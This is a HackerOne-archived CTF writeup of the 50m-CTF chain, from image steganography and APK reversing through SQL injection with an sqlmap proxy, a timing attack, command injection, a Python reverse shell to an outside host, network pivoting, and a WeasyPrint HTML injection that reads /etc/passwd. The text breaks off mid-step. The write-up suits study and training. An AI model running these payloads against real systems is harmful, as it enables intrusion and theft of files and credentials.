@@ -1,0 +1,706 @@
+ReportLink:https://hackerone.com/reports/507023
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/voidmercy
+ReportedTo:50m-ctf(50m-ctf)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.04.2019 15:54:55
+
+Summary:
+
+# Hackerone 50m-CTF Writeup
+By [VoidMercy](https://twitter.com/_VoidMercy)
+
+Proof of Completion: `c8889970d9fb722066f31e804e351993`
+
+## Step 1: Twitter Post Image Steganography
+
+The 50M Hackerone challenge began with a [tweet](https://twitter.com/Hacker0x01/status/1100543680383832065) from [@Hacker0x01](https://twitter.com/Hacker0x01). At first, I did not expect this tweet to be the start of the challenge, but little did I know, this tweet marked the beginning of the rabbit hole. Specifically, we can infer from [Cody Brocious](https://twitter.com/daeken)'s [reply](https://twitter.com/daeken/status/1100559538548326401), that the clues related to the CTF are embedded in the tweet.
+
+Upon closer inspection of the tweet, we observe that there are two images attached, and it is likely that they contain information to allow us to advance in the CTF. When trying to click on and save the images, I realized that doing so would download the entire HTML page rather than just the image because of Twitter's HTML styling choices. Instead, to download the images, I opened up the Network tab in Chrome's Developer Tools, navigated to the Img tab as I loaded the tweet, then searched for the two attached images in the tweet, as shown below:
+
+![](img1.jpg)
+
+After downloading the images and renaming them to `img1.jpg` and `img2.png`, using the command `file [filenames]`, we can see that one of them is a JPEG image, and another is a PNG image.
+
+```
+alex@WINDOWS-0A3VRFK:/mnt/e/CTF/h1/step1$ file img1.jpg img2.png
+img1.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 1200x630, frames 3
+img2.png: PNG image data, 900 x 473, 8-bit/color RGB, non-interlaced
+```
+
+There are many methods to hide information in an image, which is called Steganography. From my past experience with CTFs, the most common Steganography techniques in a CTF challenge would be the following:
+
+1. Embedding text within the raw bytes of the image.
+2. Bit Steganography, which is hiding data in the bits of the pixel data in an image.
+3. Embedding another file within the image
+4. Hiding pixels in a single color plane
+
+To test the first idea, we can use the command `strings -n 10 [filenames]`. The `strings` tool extracts ascii text from the raw bytes of a file, and the `-n 10` argument tells the tool to return ascii text that are 10 or more characters long. The reason to specify a length is because odds are, important data stored within the image will not be less than 10 characters long. Thus, the command we run is: `strings -n 10 img1.jpg img2.png`. Parts of the output is shown below:
+
+```
+alex@WINDOWS-0A3VRFK:/mnt/e/CTF/h1/step1$ strings -n 10 img1.jpg img2.png
+1jCe#0S]n]
+i;im{--IK\^
+ZN0Y]   kDkL
+)tx[15tJ..
+_c3.G#33332R
+----------- snip -----------
+ykFn+ymL`F
+fKs/DV!Hfb]
+~e:;lD=/S4
+```
+
+Sadly, there were no interesting strings in the output. We move on to test the next method.
+
+To test the second method, we can use a tool called [zsteg](https://github.com/zed-0xff/zsteg), which can be installed with `gem install zsteg`. Because a JPEG image uses lossy compression, least significant bit (LSB) data will likely be destroyed and unrecoverable. So, the PNG image is much more likely to have hidden data. Zsteg is a tool that attempts to extract the strings from many different combinations of pixel color bits. We can run zsteg with the command `zsteg -a img2.png`, where the -a flag tells zsteg to essentially try everything. We get the following output:
+
+```
+alex@WINDOWS-0A3VRFK:/mnt/e/CTF/h1/step1$ zsteg -a img2.png
+imagedata           .. text: "E_B.\n3T|="
+b4,r,lsb,xy         .. text: "$3r%2U2#S@6T"
+b4,g,lsb,xy         .. text: "%\"%S\#@Sfw`"
+----------- snip -----------
+b6,bgr,lsb,xy,prime .. text: "YETYEWUU"
+b7,b,msb,xy,prime   .. text: "(4:M &Q(42"
+b1,rgb,lsb,yx       .. zlib: data="https://bit.do/h1therm", offset=5, size=22
+```
+
+Jackpot! We find a link hidden in LSB in the PNG image: `https://bit.do/h1therm`. Now we can move on to the next step.
+
+For the sake of completeness, the third Steganography method I listed can be tested using the tool [binwalk](https://github.com/ReFirmLabs/binwalk), and the fourth using the tool [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve).
+
+## Step 2: Android APK Reversing
+
+The link takes us to Google Drive from which we then download an apk file named `h1thermostat.apk`. An APK file stands for Android Package, and is essentially a bunch of files packaged in an archive. Because Android Apps are written in Java and compiled Java code, or Java bytecode, is decompilable, we can actually decompile the code in an APK file. A great tool that does this for us is [jadx](https://github.com/skylot/jadx). We can run jadx, and select the APK file we want to decompile, as shown below:
+
+![](img2.jpg)
+
+Looking through `AndroidManifest.xml`, we can see references to `com.hackerone.thermostat.ThermostatActivity` and `com.hackerone.thermostat.LoginActivity`, which is important Java code the app is running. We navigate to these files and begin reverse engineering them.
+
+I will be focusing on the important parts of the code. Upon first glance of the code, the part that stands out most is the following:
+
+```Java
+ private void attemptLogin() throws Exception {
+//----------- snip -----------
+JSONObject jSONObject = new JSONObject();
+        jSONObject.put("username", username);
+        jSONObject.put("password", password);
+        jSONObject.put("cmd", "getTemp");
+        Volley.newRequestQueue(this).add(new PayloadRequest(jSONObject, new Listener<String>() {
+            public void onResponse(String str) {
+                if (str == null) {
+                    LoginActivity.this.loginSuccess();
+                    return;
+                }
+                LoginActivity.this.showProgress(false);
+                LoginActivity.this.mPasswordView.setError(str);
+                LoginActivity.this.mPasswordView.requestFocus();
+            }
+        }));
+}
+```
+
+We observe that the code is creating a JSONObject that is then passed to the constructor of a PayloadRequest. We can see that PayloadRequest is another class jadx decompiled for us, so we can also reverse engineer that. The constructor of the class is as follows:
+
+```Java
+public PayloadRequest(JSONObject jSONObject, final Listener<String> listener) throws Exception {
+        super(1, "http://35.243.186.41/", new ErrorListener() {
+            public void onErrorResponse(VolleyError volleyError) {
+                listener.onResponse("Connection failed");
+            }
+        });
+        this.mListener = listener;
+        this.mParams.put("d", buildPayload(jSONObject));
+    }
+```
+
+We immediately see ``http://35.243.186.41/`. A URL is a very good sign. Just from the information above, we can infer that the Android app is submitting username, password, and cmd data to the url `http://35.243.186.41/`. This data is somehow combined through the `buildPayload` function and passed as a parameter to the key 'd'. We can see how the JSON object containing the username, password, and cmd is created in the `buildPayload` shown below:
+
+```Java
+private String buildPayload(JSONObject jSONObject) throws Exception {
+        SecretKeySpec secretKeySpec = new SecretKeySpec(new byte[]{(byte) 56, (byte) 79, (byte) 46, (byte) 106, (byte) 26, (byte) 5, (byte) -27, (byte) 34, (byte) 59, Byte.MIN_VALUE, (byte) -23, (byte) 96, (byte) -96, (byte) -90, (byte) 80, (byte) 116}, "AES");
+        byte[] bArr = new byte[16];
+        new SecureRandom().nextBytes(bArr);
+        IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);
+        Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
+        instance.init(1, secretKeySpec, ivParameterSpec);
+        byte[] doFinal = instance.doFinal(jSONObject.toString().getBytes());
+        byte[] bArr2 = new byte[(doFinal.length + 16)];
+        System.arraycopy(bArr, 0, bArr2, 0, 16);
+        System.arraycopy(doFinal, 0, bArr2, 16, doFinal.length);
+        return Base64.encodeToString(bArr2, 0);
+    }
+```
+
+The encryption scheme used here is `AES/CBC/PKCS5Padding`, and we also have the secret key. The JSONObject is converted to a string and encrypted with AES. The result is then base64 encoded and returned. Now, we have finished reversing the Android APK, and can move on to attacking the url we found.
+
+## Step 3: SQL Injection
+
+Now we have all the information we need to perform the request the Android app is making. My code that implements the encryption scheme to communicate with the server is shown below:
+
+```python
+from Crypto.Cipher import AES
+import requests, json
+
+def PKCS5Padding(s):
+    padn = 16 - (len(s) % 16)
+    return s + chr(padn) * padn
+
+data = {"username":"admin","password":"password","cmd":"A"}
+key = '8O.j\x1a\x05\xe5";\x80\xe9`\xa0\xa6Pt'
+encrypted = ("\x00" * 16 + AES.new(key, AES.MODE_CBC, "\x00" * 16).encrypt(PKCS5Padding(json.dumps(data)))).encode("base64")
+
+req = requests.post("http://35.243.186.41/", data={"d": encrypted})
+response = req.content.decode("base64")
+
+response = AES.new(key, AES.MODE_CBC, response[:16]).decrypt(response[16:])
+print response.strip()
+```
+
+It turns out both our data and the response from the server are encrypted and decrypted with the same AES encryption scheme, so we include that in our code. As a result, the response we get from the server is: `{"success": false, "error": "Unknown"}`.
+
+Because we have ourselves a login form, since the server expects a username and password field, we can try an SQL Injection attack, which is a common attack in CTFs for login pages.
+
+A tool to do this for us is [sqlmap](http://sqlmap.org/). Sqlmap tests for SQL injections given a url and the parameters to test. However, sqlmap by itself cannot encrypt the username and password parameters and send it to server. My solution to this is the create a proxy running on localhost which serves as a bridge between sqlmap and the server. It would take in the username and password from sqlmap, encrypt the data and send it to the server. Likewise, it would receive the response from the server, decrypt it, and send it back to sqlmap. My proxy is shown below:
+
+```python
+from flask import Flask, request
+from Crypto.Cipher import AES
+import requests, json
+
+app = Flask(__name__)
+
+def PKCS5Padding(s):
+    padn = 16 - (len(s) % 16)
+    return s + chr(padn) * padn
+
+def encrypt_data(data):
+    key = '8O.j\x1a\x05\xe5";\x80\xe9`\xa0\xa6Pt'
+    encrypted = ("\x00" * 16 + AES.new(key, AES.MODE_CBC, "\x00" * 16).encrypt(PKCS5Padding(json.dumps(data)))).encode("base64")
+    return encrypted
+
+def decrypt_data(data):
+    key = '8O.j\x1a\x05\xe5";\x80\xe9`\xa0\xa6Pt'
+    response = data.decode("base64")
+    response = AES.new(key, AES.MODE_CBC, response[:16]).decrypt(response[16:])
+    return response[:-ord(response[-1])]
+
+@app.route("/", methods=["POST"])
+def send():
+    data = {"username": request.form.get("username"), "password": request.form.get("password"), "cmd": request.form.get("cmd")}
+    enc = encrypt_data(data)
+    req = requests.post("http://35.243.186.41/", data={"d": enc})
+    return decrypt_data(req.text)
+
+app.run(debug=False, host='0.0.0.0', port=80)
+```
+
+Now, since my proxy is running on localhost port 80, we should point sqlmap to http://localhost:80. The command I used is `sqlmap -u "http://localhost:80" --method=POST --data="username=admin&password=admin" --dump --level=3 --risk=1`. The `-u "http://localhost:80"` specifies the url, `--method=POST` specifies the method, `--data="username=admin&password=admin"`, specifies the post data, `--dump` tells sqlmap to dump all the data, and `--level=3 --risk=1` increases the types of sql injection tests to try.
+
+After running this, sqlmap was able to dump the database through an error based attack, and we get the following:
+
+```
+Database: flitebackend
+Table: users
+[1 entry]
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
++----+----------+----------------------------------+
+
+Database: flitebackend
+Table: devices
+[30 entries]
++----+-----------------+
+| id | ip              |
++----+-----------------+
+| 1  | 192.88.99.253   |
+| 2  | 192.88.99.252   |
+| 3  | 10.90.120.23    |
+| 4  | 244.188.235.4   |
+| 5  | 192.88.99.184   |
+----------- snip -----------
+```
+
+In the users table, we see an admin account, and a password. If we google the password hash, we find that it is the md5 of "password." We can try providing the credentials admin:password to the site, but quickly discover that this only allows us to set the cmd parameters to getTemp and setTemp, and does not lead to any other attack surface.
+
+Next, we inspect the list of 151 ips. To quickly scan each of the ips, I used to tool [nmap](https://nmap.org/), a port scanning tool. To use this tool, I compiled a list of the ips, and ran nmap on each of them using the command `nmap -v -p80 $(cat ips.txt)` The `-v` argument tells nmap to be more verbose, the `-p80` argument checks if port 80 of each ip is open or not, and the `$(cat ips.txt)` tells bash to perform the command for every line in ips.txt, in other words, every ip.
+
+If we scroll through the output, we find that port 80 is open for only a single host:
+
+```
+----------- snip -----------
+Nmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+----------- snip -----------
+```
+
+This host, `104.196.12.98`,  will be our next target.
+
+## Step 4: Timing Attack
+
+Visiting this site, we see yet another login page:
+
+![](img3.jpg)
+
+We can view the source code of the HTML page to see what it does:
+
+```
+<!doctype html>
+<html>
+	<head>
+		<title>FliteThermostat - Log In</title>
+	</head>
+	<body>
+		
+		<h1>FliteThermostat Login</h1>
+		Username: <input type="text" id="username" name="username"><br>
+		Password: <input type="password" id="password" name="password"><br>
+		<button id="login" onClick="login()">Log In</button>
+		<form id="form" method="POST"><input type="hidden" id="hash" name="hash"></form>
+		<script src="login.js"></script>
+	</body>
+</html>
+```
+
+We observe that the `login()` function from `login.js` is called when the user presses submit, and there is a POST form that submits a single value called `hash`. Just from this information alone, we can surmise that the login function generates a hash based on the username and password, then submits that to the form through the parameter hash. We can verify this theory using [Burp Suite](https://portswigger.net/burp) and setting our browser's proxy server to use Burp's proxy:
+
+![](img4.jpg)
+
+Now, we need to attack this login somehow. Because the username and password is hashed, an attack like SQL Injection is out of the question because a hash cannot be reversed, so as a result, the username and password would not be passed into a database query. Thus, an injection attack is out of the question. So, my ideas were:
+
+1. The hashing method is weak and there are a lot of collisions
+2. Timing attack on the hash
+
+To test these ideas, I copied the javascript code from login.js that generates a hash and modified it to take command line parameters when run with [node](https://nodejs.org/en/).
+
+To test the first idea, I tried to find collisions by using the username `admin`, and testing numerical passwords that counted up from 1. However, this did not work and the hashing algorithm seemed to be secure.
+
+For the second idea, I wrote a script that iterated through all 256 possible values for a byte and sent those as the hash field. I would then time the time it takes for the server to respond. At first, this idea did not work, but I later realized that I did not pad the hash to 32 bytes, since the server is expecting a 32 byte hash. After doing so, I discovered that for the first byte, every response took around 0.5 seconds except for one byte, 0xf9, which always took 1 second or longer for the server to respond. This was it, there was a 0.5 second pause in between every correct character, and using this, we can perform a timing attack. My code to do this is shown below:
+
+```python
+import requests
+import time
+import threading
+
+def getthreshold(correct_hash):
+	next_minimum = 1 + (len(correct_hash) / 2) * 0.5
+	return next_minimum
+
+def testshit(fhash, correct_hash, curtest, ret):
+	deets = []
+	c = 0
+	good = True
+	ret[int(curtest, 16)] = False
+	while True:
+		start = time.time()
+		r = requests.post(url, data={'hash': fhash})
+		end = time.time()
+		print curtest, end - start, getthreshold(correct_hash)
+		if "Invalid" not in r.text:
+			c += 1
+			if c >= 8:
+				ret[int(curtest, 16)] = True
+				return True
+		else:
+			return False
+	return False
+		
+
+url = "http://104.196.12.98"
+correct_hash = ""
+
+numthreads = 32
+
+while len(correct_hash) < 64:
+	correct_hashs = [0]*256
+	for i in range(0, 0xff+1, numthreads):
+		threads = []
+		for a in range(numthreads):
+			fhash = correct_hash + hex(i + a)[2:].zfill(2)
+			fhash += "a"*(64-len(fhash))
+			t = threading.Thread(target=testshit, args=(fhash, correct_hash, hex(i + a)[2:].zfill(2), correct_hashs))
+			t.start()
+			threads.append(t)
+		for a in range(numthreads):
+			threads[a].join()
+		found = False
+		for a in range(numthreads):
+			if correct_hashs[i + a]:
+				correct_hash += hex(i + a)[2:].zfill(2)
+				found = True
+				break
+		if found:
+			break
+	print correct_hash
+```
+
+After running this script for a while, we receive the hash that allows us to authenticate: `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8` To authenticate with this hash in our browser, we can use Burp Suite again to intercept the request and change the value of the hash to the hash we just found.
+
+## Step 5: Command Injection Through GET Parameters
+
+After logging in, we are greeted with more options:
+
+![](img5.jpg)
+
+The `Temperature control` page seems to just implement the SetTemp and GetTemp functions we discovered from the Android APK before.
+
+The `Check for Updates` page, however, seems much more interesting. After clicking on it, we see:
+
+```
+FliteThermostat Check for Updates
+
+Connecting to http://update.flitethermostat:5000/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+Because we see the server trying to contact a link, the first thought that jumps at me is that there might be a Server Side Request Forgery (SSRF) bug, which occurs when we are able to control the url the server communicates with.
+
+To test this idea, I thought that maybe there might be parameters in the url that allow us to control the host and port. I tested the url, `http://104.196.12.98/update?port=1337`, with the GET parameter port set to 1337 and we get the response:
+
+```
+Connecting to http://update.flitethermostat:1337/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+Bingo! We see that the port has changed from 5000 to our provided value, 1337. Going along this train of thought, there must be a parameter that controls the hostname.
+
+This step actually took me the longest since I had tried numerous parameters that seem reasonable such as ip, host, hostname, domain. However, Coby's [tweet](https://twitter.com/daeken/status/1101358829168558080) of a single underscore allowed me to finally guess the parameter: update_host. When we visit `http://104.196.12.98/update?port=1337&update_host=hacked`, we get the following:
+
+```
+Connecting to http://hacked:1337/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+Because I had been so absorbed in the idea of an SSRF bug, I proceeded to port write a port scanner for every port on localhost, seeing if I would get a different response, but this did not work.
+
+I thought about other ideas to try on the parameters, and I thought of command injection, and tried the url: `http://104.196.12.98/update?port=1337&update_host=$(id)`
+
+```
+Connecting to http://uid=0(root) gid=0(root) groups=0(root):1337/ and downloading update manifest
+...
+...
+...
+Could not connect
+```
+
+Jackpot. Additionally, it seems the process is running as root, so we also have root access to the server. Next, we can get a shell on the box and explore the server.
+
+## Step 6: Pivoting
+
+First step is to obtain a reverse shell. We can find reverse shell payloads [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and the python one worked for me. The code to send the reverse shell is as follows:
+
+```python
+import requests
+
+cookie = {"session":"eyJsb2dnZWRJbiI6dHJ1ZX0.XH6IVA.95r7Iy7hLrnRnmPhKsJ3y7eIEwk"}
+
+url = """http://104.196.12.98/update?update_host=$(python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("REDACTED",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') &port=80"""
+r = requests.get(url, cookies=cookie)
+```
+
+We can change the IP and port of the reverse shell to point to our server, then listen on that port on our server using `nv -lvp [port number]`.
+
+```
+root@ctf:~# nc -lvp 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+Connection from 98.12.196.104.bc.googleusercontent.com 52814 received!
+/bin/sh: 0: can't access tty; job control turned off
+# ls
+1
+Dockerfile
+__pycache__
+login.js
+main.py
+requirements.txt
+templates
+temptarget
+update.sh
+uwsgi.ini
+```
+
+Now we can explore the machine. However, it seems to be running in a docker container, and there aren't any other interesting files. However, we can check the network of the docker container using `ip addr show`, and we see the following:
+
+```
+# ip addr show
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+158: eth0@if159: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:ac:17:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.23.0.3/16 brd 172.23.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+```
+
+The server seems to be in a local network, with the subnet `172.23.0.3/16`. Maybe there are other open apps on the same network?
+
+We can check whether there's an app on port 80 of an ip using `curl` with `curl 172.23.0.3`. 
+
+```
+# curl 172.23.0.3
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   451  100   451    0     0   233k      0 --:--:-- --:--:-- --:--:--  440k
+<!doctype html>
+<html>
+        <head>
+                <title>FliteThermostat - Log In</title>
+        </head>
+        <body>
+
+                <h1>FliteThermostat Login</h1>
+                Username: <input type="text" id="username" name="username"><br>
+                Password: <input type="password" id="password" name="password"><br>
+                <button id="login" onClick="login()">Log In</button>
+                <form id="form" method="POST"><input type="hidden" id="hash" name="hash"></form>
+                <script src="login.js"></script>
+        </body>
+</html>
+```
+
+Sure enough, since we used curl on the server's own ip, the server's own web application is queried and returned. However, lets check other IPs on the subnet. We know that DHCP uses low IPs on the subnet first, so it is logical to check around our IP, such as 172.23.0.2, and 172.23.0.4:
+
+```
+# curl 172.23.0.4
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0curl: (7) Failed to connect to 172.23.0.4 port 80: No route to host
+# curl 172.23.0.2
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1669  100  1669    0     0   757k      0 --:--:-- --:--:-- --:--:-- 1629k
+<!DOCTYPE html>
+<html lang="en">
+----------- snip -----------
+<b>Materials contained within are confidential and for HackerOne employee eyes only</b>
+
+                </div>
+                <script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
+                <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
+        </body>
+</html>
+```
+
+Sweet! We found another web application running on the network, and this will be our next target.
+
+## Step 7: HTML Injection and Local File Download
+
+Using curl to access the webpage, we find a couple of endpoints: /auth, /reports, /invoices, /invoices/newInvoice.js. The newInvoice.js looks interesting, so we can curl it, and we get:
+
+```javascript
+var itemCount = 0;
+
+function addItem() {
+        var table = $('#item-table > tbody');
+        var tr = $('<tr>');
+        function add(pfx, def) {
+                tr.append($('<td><input type="text" id="' + pfx + '-' + itemCount + '" value="' + def + '"></td>'));
+        }
+        add('quantity', '1');
+        add('name', '');
+        add('desc', '');
+        add('unit-price', '10');
+        tr.append($('<td id="total-' + itemCount + '"></td>'));
+        table.append(tr);
+        $('#quantity-' + itemCount).change(updateTotals);
+        $('#unit-price-' + itemCount).change(updateTotals);
+        itemCount++;
+        updateTotals();
+}
+
+function updateTotals() {
+        for(var i = 0; i < itemCount; ++i) {
+                var amt = parseFloat($('#quantity-' + i).val()) * parseFloat($('#unit-price-' + i).val());
+                $('#total-' + i).text('$' + amt);
+        }
+}
+
+function encodeInvoice() {
+        var items = [];
+        for(var i = 0; i < itemCount; ++i) {
+                items[i] = [
+                        $('#quantity-' + i).val(),
+                        $('#name-' + i).val(),
+                        $('#desc-' + i).val(),
+                        $('#unit-price-' + i).val()
+                ];
+        }
+
+        var jobj = {
+                companyName: $('#recipient-company-name').val(),
+                email: $('#recipient-email').val(),
+                invoiceNumber: $('#invoice-number').val(),
+                date: $('#invoice-date').val(),
+                items: items,
+                styles: {body: {'background-color' : 'white'}}
+        };
+
+        var p = JSON.stringify(jobj);
+        return p;
+}
+
+function preview() {
+        // kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH
+        //  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9
+        var p = encodeInvoice();
+        var url = 'http://' + window.location.hostname + '/invoices/preview?d=' + encodeURIComponent(p);
+        url = url.replace(/[\u00A0-\u9999<>\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
+        $('#iframe-box').empty();
+        $('#iframe-box').append($('<iframe width="100%" height="500px" src="' + url + '"></iframe>'));
+}
+function savePDF() {
+        var p = encodeInvoice();
+        var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);
+        url = url.replace(/[\u00A0-\u9999<>\&]/gim, function(i) { return '&#'+i.charCodeAt(0)+';'; });
+        var a = $('<a download href="' + url + '"><span><i>If your download does not start, click here</i></span></a>');
+        $('#iframe-box').append(a);
+        a.find('span').trigger('click');
+}
+
+$(document).ready(function() {
+        addItem();
+        $('#add-item').click(addItem);
+        $('#preview').click(preview);
+        $('#save-pdf').click(savePDF);
+});
+```
+
+The two most important functions are preview() and savePDF(). After reversing it, we see that preview() and savePDF() sends url-encoded data to /invoices/preview and /invoices/pdfize with a GET parameter. We can run the javascript functions using nodejs again, and find that the url-encoded data is of the form:
+
+```
+{"companyName":"something","email":"something","invoiceNumber":"something","date":"something","items":[],"styles":{"body":{"background-color":"white"}}}
+```
+
+We can urlencode this payload ourselves and send a request to /preview and /pdfize ourselves with
+
+```
+curl 172.23.0.2/invoices/preview?d=%7B%22companyName%22%3A%22something%22%2C%22email%22%3A%22something%22%2C%22invoiceNumber%22%3A%22something%22%2C%22date%22%3A%22something%22%2C%22items%22%3A%5B%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D
+```
+
+and we get:
+
+```
+<!DOCTYPE html>
+<html lang="en">
+        <head>
+                        <meta charset="utf-8">
+                        <title>Accounting</title>
+                        <meta name="viewport" content="width=device-width">
+                        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
+                        <script src="//code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+                        <style>.navbar-fixed-top { position: absolute!important; }</style>
+
+
+        </head>
+        <body>
+----------- snip -----------
+</div>
+
+                </div>
+                <script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
+                <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
+        </body>
+</html>
+```
+
+We can see that /invoices/preview returns HTML. We can try the same on /invoices/pdfize with
+
+```
+curl 172.23.0.2/invoices/pdfize?d=%7B%22companyName%22%3A%22something%22%2C%22email%22%3A%22something%22%2C%22invoiceNumber%22%3A%22something%22%2C%22date%22%3A%22something%22%2C%22items%22%3A%5B%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D
+```
+
+The result is the following pdf file:
+
+![](img6.jpg)
+
+This pdf seems to match the HTML, so we can thus surmise that the data we provide is inserted into an HTML template and then converted to a PDF. Now we ask ourselves, how do we attack this?
+
+The idea I had was to have the HTML to PDF parser fetch a file for us, since we can include attachments in HTML. To do this, first we have to figure out what HTML to PDF parser the backend is using. Taking a look at the payload we provide, we can see that part of the json data is CSS data. If we set the background-image CSS field to point to our server, then the PDF parser must send a request to our server. To test this, I used the following payload:
+
+```
+{"companyName":"something","email":"something","invoiceNumber":"something","date":"something","items":[],"styles":{"body":{"background-color":"white", "background-image", "url('REDACTED/test.jpg"}}}
+```
+
+Sure enough, the PDF parser made a request:
+
+```
+"GET /test.jpg HTTP/1.1" 200 415 "-" "WeasyPrint 44 (http://weasyprint.org/)"
+```
+
+Now we know the parser that is used. We can now look online for how to include attachments using WeasyPrint, leading me to [this](https://github.com/Kozea/WeasyPrint/issues/558) link. This tells us that we can include a file in the PDF using:
+
+```
+<link rel=attachment href="path-to-some-file" />
+```
+
+Now we have to maniuplate the HTML using the JSON data we provide so that we include the attachment link. To do this, I tested adding `<link>` to every field in the JSON data until I found one that is not properly escaped. It turned out to be in the CSS field. To end the CSS styling, we must include `</style>`, but this did not work at first. To work around this, I found that the template parser interprets `<</style>/>` into `</style>`, thus allowing us to escape the CSS and inject our own HTML. Now, we just have to include the link to the attachment. My JSON payload is as follows:
+
+```
+{"companyName":"test","email":"test","invoiceNumber":"test","date":"test","items":[],"styles":{"body":{"background<</style>/style><link rel='attachment' href='file:///etc/passwd'><style>":"white"}}}
+```
+
+Sure enough, when we send this as the payload and download the PDF, we obtain `/etc/passwd` as shown below:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+nginx:x:101:102:nginx user,,,:/nonexistent:/bin/false
+messagebus:x:102:103::/var/run/dbus:/bin/false
+```
+
+We have an arbitrary local file download, and now we just have to search for any interesting files. I first looked in `/proc/self/environ` to view the environment variables:
+
+```
